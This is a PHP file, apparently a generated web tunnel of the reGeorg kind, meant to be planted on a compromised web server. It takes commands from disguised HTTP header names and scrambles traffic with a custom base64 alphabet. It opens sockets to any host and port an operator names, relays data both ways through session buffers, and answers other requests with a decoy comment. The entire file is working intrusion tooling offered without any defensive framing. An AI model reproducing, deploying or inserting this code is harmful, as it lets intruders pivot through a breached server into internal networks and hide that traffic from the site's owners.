<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[ucwords(strtolower($arh_key))] = $val;
            }
        }
        return($arh);
    }
}

set_time_limit(0);
$headers=apache_request_headers();
$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
$de = "YxaDU9SrZg1qtCVhQmzLBpkIFAsK8M63ENwu720oT4bR+y5lPfiedHXOGj/nJvWc";

$cmd = $headers["Atdyuavowzxgt"];
$mark = substr($cmd,0,22);
$cmd = substr($cmd, 22);
$run = "run".$mark;
$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;

switch($cmd){
    case "vue2rhFfdcdnw3pv76TD83InNOgJDBZURr5R":
        {
            $target_ary = explode("|", base64_decode(strtr($headers["Ibzyaditsiqilvb"], $de, $en)));
            $target = $target_ary[0];
            $port = (int)$target_ary[1];
            $res = fsockopen($target, $port, $errno, $errstr, 1);
            if ($res === false)
            {
                header('Lvuksdmrc: Syj');
                header('Hyuwhutfyatwgz: aQvfjr0MJqAnXpr4waT6sPbRRzgSSq5tOODm4UuJAHY6yqEjIflLzgJOCSXR');
                return;
            }

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 10)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "iQcS47":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "oBYiWGawKSKRL4ZTMEspuIzeli0EnX":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                header('Lvuksdmrc: SCboiiQmy8pI6XdwJmiKeX3ByRkmgEl5qDwfBNdUr7SL9R1KxbDFo7uR4');
                header("Connection: Keep-Alive");
                echo strtr(base64_encode($readBuffer), $en, $de);
            } else {
                header('Lvuksdmrc: Syj');
            }
        }
        break;
    case "O7vc_OogCNPZ9Mnp6DbRJ3PqE9Seg26o1yMRQFSmL": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                header('Lvuksdmrc: Syj');
                header('Hyuwhutfyatwgz: SOtLxwLE5Hie6');
                return;
            }
            header('Content-Type: application/octet-stream');
            $rawPostData = file_get_contents("php://input");
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= base64_decode(strtr($rawPostData, $de, $en));
                session_write_close();
                header('Lvuksdmrc: SCboiiQmy8pI6XdwJmiKeX3ByRkmgEl5qDwfBNdUr7SL9R1KxbDFo7uR4');
                header("Connection: Keep-Alive");
            } else {
                header('Lvuksdmrc: Syj');
                header('Hyuwhutfyatwgz: lvIrA4zYfoEiLXN3uK2Q3hgbO_6cdH');
            }
        }
        break;
    default: {
        @session_start();
        session_write_close();
        exit("<!-- cK4FADwwrWjmfIlGmcPPNoD122Pd8oqYyuIXVXFZGK -->");
    }
}
